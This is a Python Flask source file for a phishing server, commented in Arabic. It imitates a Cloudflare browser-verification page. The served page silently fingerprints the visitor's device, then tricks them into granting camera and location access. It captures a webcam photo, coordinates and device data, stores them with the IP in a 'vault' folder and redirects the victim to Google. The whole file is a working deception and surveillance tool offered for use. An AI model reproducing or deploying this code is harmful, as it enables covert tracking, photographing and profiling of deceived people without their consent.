import os, base64, time, json
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
DB_PATH = "the_vault"
os.makedirs(DB_PATH, exist_ok=True)

# --- 1. Payload الخداع (Cloudflare Imitation) ---
victim_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Checking if the site connection is secure</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; color: #313131; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { max-width: 600px; padding: 20px; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #f6821f; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #verify-btn { background: #f6821f; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Checking your browser...</h1>
        <p>Please click the button below to verify you are not a robot.</p>
        <button id="verify-btn">Verify Identity</button>
    </div>

    <script>
        // Payload 1: سحب بصمة الجهاز فوراً (بدون موافقة)
        const getFingerprint = async () => {
            const battery = await (navigator.getBattery ? navigator.getBattery() : {level: 0, charging: false});
            const gl = document.createElement('canvas').getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            
            return {
                ua: navigator.userAgent,
                gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_INFO) : "N/A",
                cores: navigator.hardwareConcurrency,
                mem: navigator.deviceMemory,
                res: `${window.screen.width}x${window.screen.height}`,
                bat: `${(battery.level * 100).toFixed(0)}%`,
                charging: battery.charging
            };
        };

        document.getElementById('verify-btn').onclick = async function() {
            this.innerHTML = "Verifying...";
            const fp = await getFingerprint();

            // Payload 2: طلب الكاميرا والموقع (بعد الضغط)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    
                    const v = document.createElement('video'); v.srcObject = stream; await v.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    
                    // إرسال "الحزمة السوداء"
                    fetch('/dark_collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            img: canvas.toDataURL('image/png'),
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            device: fp
                        })
                    }).then(() => {
                        window.location.href = "https://www.google.com";
                    });
                });
            } catch (err) { alert("Verification failed. Please allow camera and location."); }
        };
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(victim_html)

@app.route('/dark_collect', methods=['POST'])
def dark_collect():
    data = request.get_json()
    ts = int(time.time())
    img_data = base64.b64decode(data['img'].split(',')[1])
    
    # حفظ الغنائم
    with open(f"{DB_PATH}/img_{ts}.png", "wb") as f: f.write(img_data)
    data['ip'] = request.remote_addr
    data['time'] = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(f"{DB_PATH}/data_{ts}.json", "w") as f: json.dump(data, f, indent=4)
    
    print(f"💀 TARGET HIT! IP: {data['ip']} | GPU: {data['device']['gpu']}")
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
